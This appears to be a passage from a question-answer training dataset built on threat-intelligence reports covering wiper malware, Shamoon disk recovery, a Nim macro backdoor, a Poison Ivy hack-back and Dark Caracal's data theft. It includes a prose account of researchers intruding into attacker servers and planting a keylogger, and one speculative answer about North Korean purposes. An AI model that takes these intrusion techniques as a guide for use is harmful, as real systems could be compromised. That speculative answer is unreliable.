Ext:\npark2@mac.com\nRegistrant Email:\nRegistry Admin ID:\nAdmin Name: guanin o\nAdmin Organization:\nAdmin Street: \"hujimi2-14-15,\"\nAdmin City: chiyodaku\nAdmin State/Province: tokyo\nAdmin Postal Code: 1028138\nAdmin Country: JP\nAdmin Phone: +81.332627111\nAdmin Phone Ext:\nAdmin Fax:\nAdmin Fax Ext:\nAdmin Email: park2@mac.com\nRegistry Tech ID:\nTech Name: Link Club\nTech Organization: Link Club\nTech Street: 5-39-6 Jingumae Shibuya-ku\nTech City: TOKYO\nTech State/Province: 150-0001\nTech Postal Code: JP\nTech Country: JP\nTech Phone: +81.462643403\nTech Phone Ext:\nTech Fax:\nTech Fax Ext:\nTech Email: mel-tech@hosting-link.ne.jp\nName Server: USR-NS1.LINKCLUB.JP\nName Server: USR-NS2.LINKCLUB.JP\nDNSSEC: unsigned\nURL of the ICANN WHOIS Data Problem Reporting System: http://wdrprs.internic.net\n>>> Last update of WHOIS database: 2014-05-13T18:15:18Z\nMedium Headline: Installation\nWhen executed it creates the following files in the affected user's %Temp% directory:\n\u2022 alg.exe: A legitimate binary used to open SSH connections with remote servers MD5 e45cd9052dd3dd502685dfd9aa2575ca\nSize: 166,912 bytes\n\u2022 conime.exe: A legitimate binary used to open SSH connections with remote servers MD5: 6a702342e8d9911bde134129542a045b\nSize: 153,600 bytes\n\u2022 ~pr1.tmp: Payload - A destructive bash script MD5: dc789dee20087c5e1552804492b042cd\nSize: 1,186 bytes\nAlso known as/detected as:\nKillMBR-FBIA (McAfee)\nTrojan:SH/Kofornix.A (Microsoft)\nTrojan.Jokra (Symantec)\n\u2022 AgentBase.exe: Payload - Win32 wiper component (see details below) MD5: db4bbdc36a78a8807ad9b15a562515c4\nSize: 24,576\nMedium Headline: Payload\u2014attempts to connect to remote servers and upload a destructive bash script\nAfter determining the location of user profile directories on the affected computer, the malware searches these directories for configuration files and directories that may be associated with the connection manager clients mRemote and SecureCRT.\n\u2022 mRemote\u2014an open source tool for centrally managing remote server connections using a GUI (Kevin Kline, 2008).69 This tool is no longer being actively developed or supported.\n\u2022 SecureCRT\u2014a commercial SSH and Telnet client by VanDyke Software.\nIf an mRemote installation is located, the dropper reads the configuration file and checks if there's a NODE that is defined with \"Username=root\", \"Protocol=SSH\", and a password that is not blank. If\nthose conditions are satisfied it extracts the information. The password is decrypted after being extracted.\nIf a SecureCRT installation is located, the dropper extracts information from sessions that have Username=root, Protocol=SSH and a saved password. If these conditions are satisfied, the username, hostname, port, and password are extracted. The password is then decrypted.\nAfter extracting these connection and server details, the dropper uses the previously dropped alg. exe and conime.exe to attempt to connect remote servers, upload and run the bash script ~pr1.tmp.\nThe bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and then attempts to wipe the /kernel, /usr /etc and /home directories, thus rendering the machine inoperative.\nMedium Headline: Win32 Wiper component\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes, presumably in order to evade detection:\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022 clisvc.exe \u2013 ViRobot ISMS from Hauri\nIt then enumerates all physical drives and overwrites the first 512 bytes with the string: \"princpes\", effectively destroying the MBR (master boot record) of the affected drive.\nIt continues to look for removable and fixed drives, locates the root directory on these drives, and then attempts to delete all files and folders in this directory.\nFinally, the affected computer is shut down and rebooted, although if the wiping mechanisms were successful then the machine will not be able to boot.\nLearn more at\nhp.com/go/hpsr\n\nQ: Analyze the WHOIS records for 'ournation-school.com' and 'chongryon.com'. What insights can be drawn from the registrant and administrative contact information regarding the potential origins and purposes of these domains?",
    "output": "A: The WHOIS record for 'ournation-school.com' shows it was registered by 'Korea 615 Shenyang company' with addresses in Shenyang, China. This suggests potential ties to North Korea, given the name and location. The domain 'chongryon.com' is registered to 'o guanin' with an address in Tokyo, Japan. The tech contact is 'Link Club' also based in Tokyo. These details suggest the domain may be related to Chongryon, the General Association of Korean Residents in Japan, which has historical ties to North Korea. Both domains could be used for purposes aligned with North Korean interests, possibly including cyber operations or propaganda.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Sednit group use reconnaissance techniques to gather information about their targets and plan future operations?",
    "output": "Reconnaissance is a crucial phase in the adversary lifecycle where attackers gather information about their targets to plan and execute future operations. In the case of the Sednit group, also known as APT28, Fancy Bear, or Pawn Storm, reconnaissance plays a vital role in their espionage activities. According to ESET's research, the Sednit group uses reconnaissance malware to gather information about their targets, including government departments, embassies, and organizations involved in geopolitics. They employ various techniques, such as spear-phishing emails, to deploy their reconnaissance tools, including the Downdelph downloader, which is used to gather information about the compromised host. The group's reconnaissance efforts allow them to identify potential targets, gather intelligence on their victims, and plan future operations, including the deployment of additional malware tools. Furthermore, the Sednit group's use of advanced persistence methods, such as bootkits and rootkits, demonstrates their ability to maintain a long-term presence on compromised systems, enabling them to continue gathering intelligence and planning future operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: VBR and File System Recovery Strategies\nThe following is the view of the wiped disk for each of the operating systems that we tested:\nFig 1. Example of wiped of MBR and VBR wiped by Shamoon Malware.\nFigure 1 was found at the MBR (Sector 0) and the VBR (Sector 63/56 (XP, 2003), and 2048/206848 (7)) of each of the operating systems (As well as throughout the drive). Fidelis\nresearchers decided to look further into the drive and find if there was any possibility of recovering files or logs that would help illuminate what happened to the systems, and if any artifacts of the malware could be recovered.\nNote on the VBR: VBR stands for Volume Boot Record, and is made up of the boot sector and bootstrap code. The boot sector takes up 1 sector on the drive; the next 6 sectors on the drive are allocated for the bootstrap code. In all 16 sectors are allocated in total for the VBR. The VBR is created when a file system is created on a partition. In this paper we will be covering the NTFS Boot Record. The VBR is used to load machine code into RAM to start a program. Normally this program is the operating system.\nKeyword searches revealed that there were still files that would be recoverable on the system. In particular it was found that registry files and headers were still on the disk. After this, it was found that the Master File Table (MFT) was still, for the most part, intact. Trying to avoid the long and laborious process of carving files from the disk, researchers decided that it would instead be worth the time to try and recover the file system.\nWhen the Windows operating system is installed or an NTFS volume created, a backup copy of the VBR is written to the last sector of the volume. This is a very important detail, as the forensic value of the VBR is substantial (See Figure 2). The area that will contain the critical information is known as the Bios Parameter Block (BPB). With this information it is possible to rebuild the file system as it existed before the wipe.\nEB 52 90 4E 54 46 53 20 20 20 20 00 02 08 00 00 00 00 00 00 00 F8 00 00 3F 00 FF 00 3F 00 00 00 00 00 00 00 80 00 80 00 C0 F8 F8 0D 00 00 00 00 00 00 0C 00 00 00 00 00 8C 8F DF 00 00 00 00 00 F6 00 00 00 01 00 00 00 26 FA CA 70 02 CB 70 44 00 00 00 00\n[\u2026 Truncated for size \u2026]\n00 00 55 AA\nEB 52 90 \u2013 Instruction to jump to boot code (Not necessary for our application)\n4E 54 46 53 20 20 20 20 \u2013 OEM Name (NTFS )\n00 02 \u2013 Bytes per sector, 0x0200 = 512 Bytes.\n08 \u2013 Sectors per cluster = 8\nF8 \u2013 Media descriptor (Not necessary for our application)\nC0 F8 F8 0D 00 00 00 00 \u2013 Total sectors in file system, 0x00DF8F8C0 = 234420416 Sectors (Add on the sector location of VBR for actual end of the file system, in this example the VBR is at sector 63 therefore the total sectors in the file system are 234420416 + 63 = 234420479)\n00 00 0C 00 00 00 00 00 \u2013 Starting cluster of the MFT, 0X000C0000 = 786432 Clusters. 786432 * 8 (Cluster size) +63 (VBR Sector) = 6291519 Sectors\n8C 8F DF 00 00 00 00 00 \u2013 Starting cluster of the MFT mirror, 0x00DF8F8C = 14651276. 14651276 * 8 + 63 = 117210271 Sectors\nF6 \u2013 Size of MFT Entry, 246.\n01 \u2013 Index size, 1.\n26 FA CA 70 02 CB 70 44 \u2013 Serial number.\nFor more technical information on file systems and their forensic value, Brian Carrier's book File System Forensic Analysis is an invaluable tool.\nFig 2. Example of a broken down BPB found within the boot sector.\nJust because the boot sector of the VBR is recoverable doesn't mean that everything on the file system will be restored to normal. If a file was wiped by the malware then it will still be wiped, or partially wiped. However files that weren't wiped will be much easier and faster to recover then carving and the context of each file will be easy to interpret.\nTo recover or identify the backup VBR a search will need to be run across the image file. It is preferable if the image file is a raw image as they are easier to edit then other image file formats. The search was performed for the hex of the VBR file header, EB 52 90 4E 54 46 53 (\u00ebR\u0141NTFS). A few hits were found throughout the drive, and it appeared that there were multiple empty VBR templates throughout the system (Shown in Figure 3). The correct VBR will likely be the one with information filled in from offset 10 \u2013 80 (See Figure 2 to breakdown). During testing it was found that the last hit was normally the correct VBR, as this would be the VBR found at the end of the volume.\nFig 3. Example of a blank VBR.\nNote: On 2003 systems the boot backup is sometimes found halfway through the partition, a manual parsing of the file will need to be performed to confirm the VBR is legitimate for the partition.\nOnce the VBR was found we noted the offset and calculated the sector to locate the backup in our desired forensic program. For the purposes of testing we used EnCase (v6.19.6). Once the sector of the backup VBR is known, EnCase was started and the image of the infected system was loaded. Within disk view we located the backup VBR and right clicked to add a manual partition as an NTFS file system. The partition was added, the MFT read, and the file system appeared:\nFig 4. File system recovered within EnCase.\nWith the file system restored some relevant artifacts can be located now, and an actual computer forensic examination can take place.\nThis recovery can be successful without the use of the EnCase suite of forensic software as well. Using a hex editor of your choice to repair the image, in our testing WinHex (16.6) was used. Find the file header of the backup VBR within a file editor, copy from the header to footer of the boot sector; the footer will always be 55 AA. The size will be 512 bytes from header to footer. Then depending on what operating system is being examined you can write the copied boot sector to the appropriate sector on the affected image.\nPlacing the boot sector into the correct location will be the trickiest part as incorrect placement will result in the file system not being recognized. The boot sector should be placed at sector 63/56 for XP/2003, and at sector 2048/206848 for Windows 7. After this is complete you will be able to add the image into the forensic program. If the file system is not recognized then it is possible that the MBR will need to be reconstructed, though this is unlikely. Before rebuilding the MBR try adding the image as a volume and not as a disk.\nNote: Other recovery techniques are certainly viable as well. There are automated partition rebuilding tools available, though some of these rely on a valid MBR to work properly (In this case that wouldn't be feasible). Other options would be the fixboot command from the Windows Recovery Console found on a Windows OS disk. What we have presented here are forensically sound methods that are easily repeatable and least damaging to the evidence/image.\n\nQ: What is the significance of the Bios Parameter Block (BPB) in the context of recovering a file system affected by the Shamoon malware?",
    "output": "A: The Bios Parameter Block (BPB) within the Volume Boot Record (VBR) is crucial for recovering a file system affected by the Shamoon malware. The BPB contains essential information about the file system, including the bytes per sector, sectors per cluster, total sectors in the file system, starting clusters of the Master File Table (MFT) and its mirror, size of MFT entries, index size, and serial number. This information allows forensic analysts to rebuild the file system as it existed before the wipe. By locating and analyzing the BPB, researchers can understand the structure of the file system and facilitate the recovery process, making it easier to interpret the context of each file and potentially recover relevant artifacts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Delivery Method\nA malicious Word document was used to drop the Nim backdoor. The document was sent as an email attachment, where the sender claims to be a Nepali government official sending security arrangements. Despite the security controls placed around macros in Office files, we (<https://www.netskope.com/blog/netskope-threat-coverage-menorah>)are still seeing APT-attributed malware using them to drop their payload, like the malware we analyzed a couple of months ago.\nInitially opening the file will show a blank document with an instruction to enable macros. When the user clicks \"Enable Content,\" the auto-trigger routine (Document_Open) in the code will execute. Once the main function is called, the code is executed through additional VBA functions inside the document.\nMalicious Word file prior enabling macro\nBig Headline: Defense Evasion\nTo help bypass AV and static based detections, the VBA project is password protected and macros are obfuscated using the Chr( ) VBA function and string concatenation. The VBA code is split into the four subroutines in the image below.\nsch_task is a function that creates a VBscript named \"OCu3HBg7gyI9aUaB.vbs\" that will serve as the chain trigger. Initially, the VBscript is created in the AppData startup folder (C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs) and is set as a hidden file. Oddly, some variables are initialized in one function, but then utilized in a different function/s, which could be meant to confuse static analysis. Some strings referring to directories and libraries are split and then concatenated to evade static detection.\nVBA code for sch_task routine.\nhide_cons is a function to create another VBScript named \"skriven.vbs,\" which will be used by \"8lGghf8kIPIuu3cM.bat\" as a shell to run other scripts. More detailed info about this batch script is found below. Again, some strings referring to directories and libraries are split and then concatenated.\nVBA code for hide_cons routine.\nread_shell is a function that creates the payload named conhost.exe, which is inside a ZIP archive. As can be seen from the screenshot below of the macro code, it assembles the ZIP from an array of decimals (by converting each to byte) stored in the \"UserForm1\" object. The resulting byte array is the actual ZIP file and is dropped to  C:\\Users\\ <user>\\AppData\\Local\\Microsoft\\conhost.zip\nVBA code for read_shell routine.\nUserForm1 Containing Decimal/Bytes.\nvb_chainis a function mainly for creating \"8lGghf8kIPIuu3cM.bat\", which will be the stage of infection before the final payload. Exact file paths are generated by the VBA macro before writing to the batch file.\nvb_chain code snapshot.\nMedium Headline: Nim Backdoor\nThe Word document drops a malicious backdoor named \"conhost.exe\". The malware is written in Nim and was likely compiled on September 20, 2023.  is a statically typed compiled programming language. Its versatility shines through its ability to be compiled to C, C++, or JavaScript, coupled with a Pythonic syntax for a developer-friendly experience.\nThe backdoor runs within the same privilege as the current user logged in. It's looking to continue its ploy that the file was from a Nepali authority by imitating government domains for its C&C server ([.]govnp[.]org). When this backdoor is left undetected, users are at risk of having attackers gaining remote access.\nEven though the C2 servers are no longer accessible at the time of analysis, we were still able to extrapolate some of its behaviors, which can be seen below.\nBig Headline: Command and control through web protocol\nOnce the backdoor confirms there are no analysis tools running, it will spawn another command prompt instance to get the machine's hostname, then connect to its C&C server. It encrypts the hostname with a function named bakery. The encrypted hostname is encoded twice in base64, spliced behind a randomly chosen C&C server URL, and then concatenated with the \".asp\" suffix at the end to obtain the URL of the final command. The command delivered by the C&C server is obtained through an HTTP GET request.\nResponse data from GET contains the command from the C&C server. If the response data is different from the last time it was fetched, it means that the C&C server has issued a new command. Otherwise it will be dormant and keep requesting the command from the C&C server. Decryption of response data (command) is done by the confectionary function, then concatenated with cmd /c to execute the command. The execution result is also sent back to the server through a GET request. The key used for encryption and decryption is \"NPA\", which may be an abbreviation of NP (Nepal) Agent.\nScreenshot of network traffic specific to the sample.\nThe sample contacts the following C2 hosts:\nmail[.]mofa[.]govnp[.]org\nnitc[.]govnp[.]org\nmx1[.]nepal[.]govnp[.]org\ndns[.]govnp[.]org\nBig Headline: Persistence through Startup Folder and Scheduled Task\nTo retain access on the machine, a VBscript named \"OCu3HBg7gyI9aUaB.vbs\"  is placed in the startup folder. The script will initially confirm an internet connection using WMI's \"Win32_PingStatus\" class to ping https://www.google[.]com. If successful, it will run a batch file named \"8lGghf8kIPIuu3cM.bat\".\nThe main task of the batch file \"8lGghf8kIPIuu3cM.bat\" is to drop files that will further unpack and create a scheduled task for the payload. The batch file will create more scripts that will carry out these subtasks:\nunz.vbs is used for decompressing the executable out from the archive into the same directory\nunzFile.vbs creates unz.vbs\n2L7uuZQboJBhTERK.bat is just for chaining; runs unzFile.vbs then runs 2BYretPBD4iSQKYS.bat\n2BYretPBD4iSQKYS.bat is just for chaining; runs unz.vbs then runs d.bat\nd.bat creates a scheduled task of the unpacked payload (conhost.exe) then runs e.bat\ne.bat deletes itself and the other scripts created by 8lGghf8kIPIuu3cM.bat\nThe batch file named \"d.bat\" creates a scheduled task to attain another persistent execution of the malware on the target machine. The scheduled task is named\n\"ConsoleHostManager\" as seen in the below screenshot.\nScreenshot for Scheduled Task created.\nBig Headline: Conclusions\nMalware written in uncommon programming languages puts the security community at a disadvantage as researchers and reverse engineers' unfamiliarity can hamper their investigation. Nim is one of the young programming languages increasingly abused by malware authors. Aside from its familiar syntax, its cross-compilation features allow attackers to write one malware variant and have it cross-compiled to target different platforms. Netskope Threat Labs will continue monitoring the usage of unpopular programming languages.\n\nQ: How does the malicious Word document used in this campaign ensure that its macros are executed, and what steps are taken to evade antivirus and static-based detections?",
    "output": "A: The malicious Word document ensures that its macros are executed by displaying a blank document with instructions to enable macros. When the user clicks 'Enable Content,' the auto-trigger routine (Document_Open) in the code executes. To evade antivirus and static-based detections, the VBA project is password protected and macros are obfuscated using the Chr() VBA function and string concatenation. The VBA code is split into four subroutines: sch_task, hide_cons, read_shell, and vb_chain. These subroutines create various scripts and files, such as VBscripts and batch files, which are used to drop the payload and achieve persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 1.4 Ethical choices\nIn this chapter is described our approach about the ethical choices made during this work.\nFirst, we warned the national and/or private Computer Security Incident Response Teams (CSIRT - CERT) associated to the targets of the attackers. Before publishing this report, we have waited for a reasonable time. Finally, all the servers from which we collected data belonged to the attackers. We do not attack or try to attack compromised machines.\nMedium Headline: 2.1 Command & Control scanner\nIn the Mandiant report, it is explained that the attacker used a well-known Remote Administration Tool (RAT) called Poison Ivy. This RAT can be freely downloaded here: . This RAT will be discussed in the next chapter.\nTo identify the machines that were using this RAT, we have developed a Poison Ivy scanner. Here is the code of this scanner:\nThe scanner sends 100 times 0x00 to a specific port and IP. If in the response the server sends back 100 other bytes followed by the specific data 0x000015D0, we know that the running service is a Poison Ivy server.\nWe chose to scan the following ports:\n\uf0b7 3460 (default Poison Ivy port)\n\uf0b7 80 (HTTP port)\n\uf0b7 443 (HTTPS port)\n\uf0b7 8080 (alternate HTTP port).\nWe decided to scan a wide IP range located in Hong Kong.\nMedium Headline: 2.3 Working hours\nWe had some difficulties to identify the C&C servers because the attackers stopped the Poison Ivy daemon when they were not using it. That explains why the scanner did not identify all the C&C servers at certain moments of the day. However, using this parameter, we were able to identify their working hours. Here is the average working hours for a week (the hour on the graph is UTC+1):\nGenerally, the attackers worked between 2AM and 10AM from Monday to Saturday included.\nMedium Headline: 3.2 Remote code execution vulnerability\nAn exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11. The description of the vulnerability can be found here: . This vulnerability allows the remote execution of arbitrary code on the command & control server. Metasploit framework provides an exploit to use this vulnerability. The code is available here: .\nThis exploit did not work in our context. The exploit has two possible exploitations:\n- by using the default password: admin\n- by using brute force\nAs the two methods did not work; we created a third one. This method consists of finding the real password used for the encryption. Our homemade exploit with an option for the password is available in Appendix.\nFor information, an additional Ruby package is needed to use the camellia cipher. The package can be installed using the gem command:\nroot@alien:# gem install camellia-rb\nThe next step was to find the password used to encrypt the communication.\nMedium Headline: 3.3 Encryption key brute forcing\nThe RAT uses a key to encrypt the communication. The password is set by the administrator and its default value is \"admin\". After a quick search on the Internet, we know that Poison Ivy uses Camellia as encryption algorithm. The encryption is made with 16 bytes blocks. So we decided to choose the following approach:\n- Send 100 bytes (with 0x00) to the daemon (same than in our scanner)\n- Get the first 16 bytes as result from the server\nHere is the formula of the result:\nThe result is not a printable value. Thus, we decided to make a base64 of this value and add the flag $camellia$ to identify the algorithm. Here is an example of result:\n$camellia$ItGoyeyQIvPjT/qBoDKQZg==\nTo get the key, we developed a \"John the Ripper\" extension. \"John the Ripper\" is an open source password cracker. The source code can be downloaded here: . OpenSSL provides the camellia algorithm. The code source of the \"John the Ripper\" plugin to crack camellia hashes by using the OpenSSL library is available in the appendix.\nAfter compiling \"John the Ripper\", a new format is available: camellia. Here is an example of a brute force session:\nThe key is \"pswpsw\". This key must be used in our homemade Metasploit exploit.\nMedium Headline: 3.4 Exploitation\nWith the information we previously described, we were able to get access to the attackers servers.\nOnce connected to the Poison Ivy server, we noticed that the server had no public IP. We attacked a server with the IP X.X.X.X (identified during the scan) and the meterpreter endpoint IP address was Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server, by using port forwarding to hide the real IP of the command & control server. We could also identify that the vendor ID of the MAC address is VMWare. By listing the processes, we are able to validate this hypothesis:\nMedium Headline: 3.5 Shellcode\nAfter a few days the attackers detected our presence on their systems, particularly because of the network connections between their Poison Ivy machines and our machines. Using the netstat command they were able to detect our connection. Basically, the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP. In order to stay stealth we had to connect to the Poison Ivy server through the proxy server. To establish this connection we decided to create our own shellcode.\nThe principle of our shellcode is as follows:\n- Once injected in a process, the shellcode looks for open sockets;\n- Once a opened socket is detected, this socket is closed;\n- After, the shellcode binds itself on the previous open port;\n- From now on, we are going to use the same technique than the one used in meterpreter (bind_tcp).\nOur shellcode goal is to close the Poison Ivy daemon's socket and then open our own socket on the same port. Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server. In this case, when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected target\u2026\nThe source code of the shellcode can be found in appendix.\nMedium Headline: 4.1 Infrastructure schema\nOur investigation allowed us to draw a network schema of the attackers' infrastructure.\nThe infected machines communicate with the proxy through the Internet. The proxy server will forward the network packets to the Poison Ivy server. The proxy feature is done by an executable called xport.exe. This executable can encode network traffic using a xor operation. This feature requires having the executable running on both machines: the proxy and the Poison Ivy server. The syntax on the proxy server is:\nThe argument number can either be set to 1 or 2 and represents the two different encoding keys. The syntax on the Poison Ivy server is:\nxport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number\nThe Poison Ivy server is managed by the attackers through a VMWare remote desktop, so that we were not able to get the real IP address of the attacker. During our investigation, we identified an established Remote Desktop Protocol (RDP) connection between the Poison Ivy server and the proxy server. We decided to install a key-logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server.\nSince the attackers use RDP to manage the proxy server and that we had access, we copied the Windows event logs. Those logs contained all IPs which established a successful RDP authentication. We identified more than 350 unique IPs:\nWe suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy).\nHere is the screenshot of the proxy RDP authentication:\nHere is the screenshot of the Poison Ivy interface:\nHere is the screenshot of an attacker using a remote shell to an infected target:\nUsing those accesses, we managed to exfiltrate a massive amount of files, event logs, netstat outputs\u2026 The interesting information can be divided in two categories:\n- Information about the tools used by the attackers;\n- Information about the targets.\nMedium Headline: 4.3 Targets\nThe attackers seem to use a dedicated proxy and Poison Ivy server combination for each target. When a target discovers the IP address of a proxy, this address is reassigned to another target. That's why it is primordial to share the C&C servers IPs with our partners. The targets were private and public companies, political institutions, activists, associations or reporters.\nOn the Poison Ivy server, a directory is created for every target. Within this directory, a directory for each infected machine was created. The naming convention for those directories is HOSTNAME^USERNAME. Here is an example:\nE:\\companyABCD\\alien^rootbsd\\\nIn those directories files are not sorted in any specific manner. The documents types are:\n- .PPT\n- .XLS\n- .DOC\n- .PDF\n- .JPG\nAmong those documents, we found:\n- Network diagrams;\n- Internal IP/user/password combination (local administrator, domain administrator, root, web, webcam\u2026);\n- Map of the building with digital code to open doors;\n- Security incident listings;\n- Security policies;\n- \u2026\nThe sensitive documents were password protected. The passwords pattern is [a-z]{3,4}[0-9]{3,4}, so it was easy to brute force them in reasonable time. Here is an example of a network diagram.\nMedium Headline: 5.1 Description\nOn one of the proxy server, we identified a binary called Terminator3.6.exe. After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool (RAT). After analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013. Additional information can be found there: http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.\nWe were lucky enough to find the client side (the malware) on the same server. These two binaries allowed us to test the product and see how it works.\n\nWhy did the investigators decide to develop a custom Poison Ivy scanner, and what specific ports did they choose to scan?",
    "output": "The investigators decided to develop a custom Poison Ivy scanner to identify machines using the Poison Ivy RAT. They chose to scan the following ports: 3460 (default Poison Ivy port), 80 (HTTP port), 443 (HTTPS port), and 8080 (alternate HTTP port). This decision was based on the known default and common ports used by the Poison Ivy RAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Exfiltrated Data\nFigure 6: A summary of some of the types of content Dark Caracal exfiltrated from victims on both Android and Windows\nNot only was Dark Caracal able to cast its net wide, it was also able to gain deep insight into each of the victim's lives. It did this through a series of multi-platform surveillance campaigns that began with desktop attacks and pivoted to the mobile device. Stolen data was found to include personal messages and photos as well as corporate and legal documentation. In some cases, screenshots from its Windows malware painted a picture of how a particular individual spent his evenings at home.\nWe found the largest collection of data from a single command and control server that operated under the domain adobeair[.] net. Over a short period of observation, devices from at least six distinct Android campaigns communicated with this domain resulting in 48GB of information being exfiltrated from compromised devices. Windows campaigns contributed a further 33GB of stolen data. The remainder of the data contained desktop malware samples, spreadsheet reports on victims, and other files.\nVictims were found to speak a variety of languages and were also from a wide range of countries. We discovered messages and photos in Arabic, English, Hindi, Turkish, Thai, Portuguese, and Spanish in the examined data. According to our analysis, infrastructure contained exfiltrated data from individuals residing in:\nBased on both the mobile and desktop campaigns we observed, we believe the attacker first exfiltrated information in January 2012. At the time of writing this report, it looks as though Dark Caracal is still uploading data from its spy campaigns, according  to the servers we are tracking.8\n8 Despite the internet service provider taking the command and control server down in July 2017, the infrastructure reappeared online again after a few days. The dip in data exfiltration due to the takedown can be observed in Figure 9 at the beginning of August. The average number of files uploaded to the server increases steadily with time.\nSmall Headline: Android Malware Content\nThe Android malware family mainly trojanizes messaging and security applications and, once it compromises a device, it is capable of collecting a range of sensitive user information. This includes recorded audio, call logs, conversations from popular chat applications, location information, browsing history, device specific metadata, contacts, and much more.\nEach Android malware sample contains a hard coded identifier that we believe represents the campaign to which it belongs. When a Dark Caracal operator instructs an infected device to upload sensitive data, it is stored on the attacker infrastructure under this campaign. While investigating this adversary, we observed content distributed across six different campaigns. In this report, we refer to these campaigns by the name of the directory to which infected devices uploaded victim data. These campaigns are listed below, along with the number of victim devices we believe Dark Caracal compromised while we were observing its operations:\n\u2022 /oldb - 28 perceived test devices, 454 potential victim devices\n\u2022 /wp7 - 4 perceived test devices, 117 potential victim devices\n\u2022 /wp8 - 1 perceived test device, 4 potential victim devices\n\u2022 /wp9 - 11 potential victim devices\n\u2022 /wp10 - 1 potential test device, 2 potential victim devices\n\u2022 /wp10s - 13 potential test devices, 21 potential victim devices\nWe did not attempt to identify targets and consider that beyond the scope of this report.\nAn overview of exfiltrated data from the Android campaigns can be seen in the figure below.\nExfiltrated data can be divided into the following categories of information:\n\u2022 SMS messages - SMS messages made up some of the more meaningful exfiltrated data. Messages included personal texts, two-factor authentication and one-time password pins, receipts and airline reservations, and company communications. Some pin codes were within their validity window at the time of writing this report.\n\u2022 Contact Lists - This data included numbers, names, addresses, bank passcodes, PIN numbers, how many times each contact was dialed, and the last time the contact was called.\n\u2022 Call logs - This data included a full record of incoming, outgoing, and missed calls along with the date and duration  of the conversation.\n\u2022 Installed Applications - This data included app names and version numbers.\n\u2022 Bookmarks and Browsing History - This data included bookmarks and browsing history from web pages. This data was seen in only one Android campaign called oldb, but it clearly identified victims that were active in political discourse.\n\u2022 Connected Wi-Fi Details - This data included observed Wi-Fi access point names, BSSIDs, and signal point strength.\n\u2022 Authentication Accounts - This data included the login credentials and which applications are using it.\n\u2022 File and Directory Listings - This data included a list of personal files, downloaded files, and temporary files, including those used by other applications.\n\u2022 Audio Recordings and Audio Messages - This data included audio recordings of conversations, some of which identified individuals by name.\n\u2022 Photos - This data included all personal and downloaded photographs, including profile pictures.\nSmall Headline: Windows Malware Content\nDark Caracal's use of Windows malware includes a wider range of command and control infrastructure beyond adobeair[.]net. Its methods and data collection, however, are similar to the Android malware.\nExfiltrated data from the Windows malware included the following general categories:\n\u2022 Desktop Screenshots - This data included full screenshots taken at regular intervals and uploaded to adobeair[.]net.  By observing these images, it is disturbingly simple to watch a victim go about his daily life and follow that individual  every step of the way.\n\u2022 Skype Logs Databases - The data included the entire Skype AppData folder for certain victims, including messaging databases.\n\u2022 Photos - This data included complete contents of the 'Pictures' folder from compromised Windows machines. It is common to see smartphone photos backed up to this location, which most often contains personal photographs of family and friends taken by the individual being targeted.\n\u2022 iPhone Backups - This data included an entire unencrypted backup of a victim's iPhone.\n\u2022 File Listings - This data included all default Windows folders and file listings.\n\u2022 Corporate and Legal Documentation - This data included a large collection of company-specific documents. Specifically, we discovered these on another live command and control server, planethdx[.]com.\nMedium Headline: The Initial Compromise\nDark Caracal relies primarily on social engineering via posts on a Facebook group and WhatsApp messages in order to compromise target systems, devices, and accounts. At a high-level, the attackers have designed three different kinds of phishing messages, the goal of which is to eventually drive victims to a watering hole controlled by Dark Caracal.\n9 Pallas' Cat is another name for \"Manul,\" a reference to EFF's Op Manul campaign on this actor\nThe group distributes trojanized Android applications with the Pallas malware through its watering hole, secureandroid[.]info. Many of these downloads include fake messaging and privacy-oriented apps.\nThere is also some indication that Dark Caracal has used physical access in the past to install the Android malware.\nSmall Headline: Social Engineering and Spear-Phishing\nDark Caracal uses phishing messages through popular applications, such as WhatsApp, in order to direct people to the watering hole.\nRight: Facebook group links to watering hole\nDark Caracal infrastructure hosts phishing sites, which look like login portals for well known services, such as Facebook, Twitter, and Google. We found links to these pages in numerous Facebook groups that included \"Nanys\" in their titles. These groups are listed in the appendix.\nGoogle has indexed several of these phishing campaigns from the tweetsfb[.]com server. We were able to link a number of phishing domains dating to the mid-to-late 2016 time period from this data. We believe the attackers used these phishing servers to capture login credentials, hijack accounts, and to push out more spoofed messages to widen their pool of victims.\nPhishing links posted in Dark Caracal linked Facebook groups include politically themed news stories, links to fake versions of popular services, such as Gmail, and links to trojanized versions of WhatsApp.\nFour Facebook profiles similar in theme \"liked\" the phishing groups. Dark Caracal likely used these fake profiles to initiate communication with victims and build a rapport before directing them either to content on the \"Nanys\" Facebook groups  or to the secureandroid[.]info domain directly.\n\nBased on the above text, answer a question. Describe the methods and types of data collected by Dark Caracal's Windows malware. How does this compare to the Android malware?",
    "output": "Dark Caracal's Windows malware uses a wider range of command and control infrastructure beyond adobeair[.]net, but its methods and data collection are similar to the Android malware. Exfiltrated data from the Windows malware includes desktop screenshots taken at regular intervals, Skype logs databases, photos, iPhone backups, file listings, and corporate and legal documentation. This data provides a comprehensive view of the victim's activities and personal information, similar to the Android malware but tailored to the Windows environment.",
